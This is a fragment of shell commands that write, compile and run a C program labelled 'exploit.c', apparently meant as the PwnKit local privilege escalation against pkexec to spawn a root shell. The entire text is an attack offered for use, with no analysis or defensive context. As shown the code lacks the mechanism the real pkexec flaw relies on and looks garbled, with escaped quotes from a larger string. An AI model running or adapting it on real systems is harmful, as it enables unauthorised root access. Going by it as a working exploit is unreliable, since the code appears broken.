#include <stdio.h>
#include <stdlib.h>
char *argv[] = {\"/bin/sh\", NULL};
char *envp[] = {\"PWNKIT=1\", NULL};
int main() {
    if (getenv(\"PWNKIT\") == NULL) {
        setenv(\"PWNKIT\", \"1\", 1);
        execl(\"/usr/bin/pkexec\", \"pkexec\", NULL);
    } else {
        execve(\"/bin/sh\", argv, envp);
    }
    return 0;
}' > exploit.c

gcc exploit.c -o exploit

./exploit

